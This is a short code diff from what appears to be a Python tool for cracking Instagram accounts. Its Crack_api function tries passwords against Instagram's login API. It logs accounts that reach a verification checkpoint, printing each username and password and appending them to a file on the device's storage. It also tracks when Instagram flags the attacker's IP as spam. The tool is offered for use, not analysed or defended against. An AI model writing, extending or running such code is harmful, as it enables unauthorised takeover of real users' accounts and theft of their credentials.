@@ -18,6 +18,7 @@ from rich import print as prints
 from datetime import datetime 
 # Global variables
 Uid, Uuid = [], []
+bkas = []
 Ok, Cp, Loop = 0, 0, 0
 xx = 0
 SistemLog = "api.instagram.com"
@@ -788,9 +789,8 @@ def Crack_api(username, kontol):
                     return True
             elif 'checkpoint_required' in str(response.text):
                 Cp += 1
-                post, peng, meng, mail, fullname, fbid, phone = data_target(username)
-                print(f"\r {WHITE}Username: {BLUE}{username}{WHITE}\n Password:{BLUE} {password}\n {WHITE}Followers: {BLUE}{peng}{WHITE}\n Following: {BLUE}{meng}{WHITE}")
-                open('data/CP.txt', 'a').write('%s|%s\n' % (username, password))
+                print(f"\r\033[1;93m [⚠ CHECKPOINT] {username} | {password}")
+                open("/sdcard/SUMON_INS_CP.txt","a").write(username+"|"+password+"\n")
                 break
             elif 'ip_block' in response.text or 'spam' in response.text or '{"message":"","status":"fail"}' in response.text:
                 sys.stdout.write(f"\rStatus IP : {RED}Spam{WHITE} lite {YELLOW}{Loop}{WHITE}/{GREEN}{str(len(Uuid))}{WHITE}/{GREEN}{str(username)[:6]}{WHITE}/Ok:-{GREEN}{Ok}{WHITE}/Cp:-{YELLOW}{Cp}{WHITE}")
